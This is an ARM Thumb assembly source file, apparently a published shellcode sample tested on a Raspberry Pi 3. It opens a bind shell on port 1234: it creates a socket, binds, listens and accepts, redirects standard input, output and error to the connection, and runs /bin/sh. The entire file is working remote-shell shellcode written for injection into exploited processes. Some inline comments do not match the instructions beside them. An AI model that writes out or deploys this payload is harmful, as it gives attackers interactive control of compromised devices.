/**
  bind shell to port 1234
  tested with linux running on raspberry pi 3  

  http://modexp.wordpress.com/   
*/

    .global _start
    .text

_start:
    // switch to thumb mode
    .code 32
    ldr    r7, =#281
    ldr    r4, =#0xD402FF02 
    add    r3, pc, #1
    bx     r3 
  
    .code 16
    // s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    eor    r2, r2, r2   // r2 = IPPROTO_IP
    mov    r1, #1       // r1 = SOCK_STREAM
    mov    r0, #2       // r0 = AF_INET
    svc    1
    
    mov    r6, r0       // r6 = s
    
    // bind(s, &sa, sizeof(sa));  
    //adr    r1, sa       // r1 = &sa
    mov    r1, r4 
    push   {r1, r2}
    mov    r1, sp
    strb   r2, [r1, #1] 
    mov    r2, #16      // sizeof(sa) 
    add    r7, #1       // r7 = 281+1 = 282 = bind
    svc    1
  
    // listen(s, 0);
    mov    r1, #1   // r1 = 0    
    mov    r0, r6
    add    r7, #2       // r7 = 282+2 = 284 = listen 
    svc    1    
    
    // r = accept(s, 0, 0);
    eor    r2, r2, r2   // r2 = 0
    eor    r1, r1, r1   // r1 = 0
    mov    r0, r6       // r0 = s
    add    r7, #1       // r7 = 284+1 = 285 = accept    
    svc    1    
    
    mov    r6, r0       // r7 = r
    
    // dup2(r, FILENO_STDIN);
    // dup2(r, FILENO_STDOUT);
    // dup2(r, FILENO_STDERR);
    mov    r1, #2       // for 3 descriptors
dup_loop:
    mov    r7, #63      // r7 = dup 
    mov    r0, r6       // r0 = r
    svc    1
    sub    r1, #1       // 
    bpl    dup_loop

    // execve("/bin/sh", NULL, NULL);    
    adr    r0, sh       // r0 = "/bin/sh" 
    eor    r2, r2, r2   // r2 = NULL
    eor    r1, r1, r1   // r1 = NULL
    strb   r2, [r0, #7] // add null terminator    
    mov    r7, #11      // r7 = execve
    svc    1
sh:    
    .ascii "/bin/shX"

